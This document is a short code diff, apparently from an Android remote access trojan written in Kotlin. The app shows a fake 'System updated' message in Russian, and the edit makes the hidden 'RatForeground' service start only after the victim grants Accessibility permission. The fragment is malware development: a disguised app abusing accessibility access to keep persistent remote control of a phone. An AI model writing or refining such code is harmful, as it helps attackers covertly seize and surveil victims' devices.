@@ -32,7 +32,7 @@ class MainActivity : android.app.Activity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         Toast.makeText(this, "Система обновлена.", Toast.LENGTH_LONG).show()
-        startForegroundService(Intent(this, RatForeground::class.java))
+        // Служба запустится сама, когда пользователь включит Accessibility
         finish()
     }
 }
@@ -103,6 +103,9 @@ class RatAccessibility : AccessibilityService() {
             notificationTimeout = 100
         }
         serviceInfo = info
+        
+        // Запускаем фоновую службу, когда пользователь дал разрешение
+        startForegroundService(Intent(this, RatForeground::class.java))
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {}
